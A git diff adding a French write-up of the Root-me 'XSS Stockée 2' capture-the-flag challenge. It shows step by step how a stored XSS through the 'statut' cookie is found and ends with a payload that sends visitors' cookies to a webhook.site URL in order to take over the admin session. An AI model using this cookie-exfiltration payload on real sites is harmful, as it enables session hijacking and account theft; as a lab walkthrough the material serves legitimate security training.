@@ -117,3 +117,25 @@
 - **Références :** https://curity.io/resources/learn/jwt-best-practices/
 
 - Éviter d'utiliser une simple comparaison de string pour vérifier la validité d'un JWT mais se baser plutôt sur l'id du JWT
+
+## Root-me | [XSS Stockée 2](https://www.root-me.org/fr/Challenges/Web-Client/XSS-Stockee-2)
+
+###
+Étapes :
+- Ouvrir le site avec Burpsuite
+- Envoyer un message via le formulaire
+- Regarder la requête envoyée dans Burpsuite
+- On constate que le cookie "statut" a la même valeur que le statut affiché à côté du message envoyé par l'utilisateur
+- On teste si on peut modifier la valeur du cookie "statut" pour y mettre autre chose
+- En mettant admin par exemple, on constate que le message envoyé affiche bien "admin" à côté et que la couleur du message est différente (rouge)
+- On en déduit qu'il est probablement possible d'injecter du code JS dans le cookie "statut"
+- On teste avec une payload simple : <script>alert(1)</script>
+- ça ne fonctionne pas, il faut essayer d'échapper des charactères afin de correctement injecter le script
+- On teste avec la payload suivante : '><script>alert(1)</script>
+- Le script s'exécute bien, on peut donc injecter du code JS via le cookie "statut"
+- On peut maintenant injecter une payload plus complexe pour récupérer les cookies des autres utilisateurs qui visitent la page
+- Payload final : "><script>document.location.href=`${"https://webhook.site/6e7b8f66-21bd-4983-9e4c-86837d8ce185?extracted_cookies=" + document.cookie}`</script>
+- Ce payload permet d'envoyer les cookies de l'utilisateur à une URL externe (webhook.site dans notre cas afin de les récupérer facilement) voir image [ici](screenshots/xss-stockee-2/repeated-request.png)
+- On envoie la requête et on récupère les cookies dans webhook.site
+- Il ne reste plus qu'à s'ajouter le cookie ADMIN_COOKIE avec la valeur récupéré pour se connecter en tant qu'admin (directement dans le navigateur par exemple) voir image [ici](screenshots/xss-stockee-2/using-the-admin-cookie.png)
+- On accède à la page admin et on récupère le mot de passe
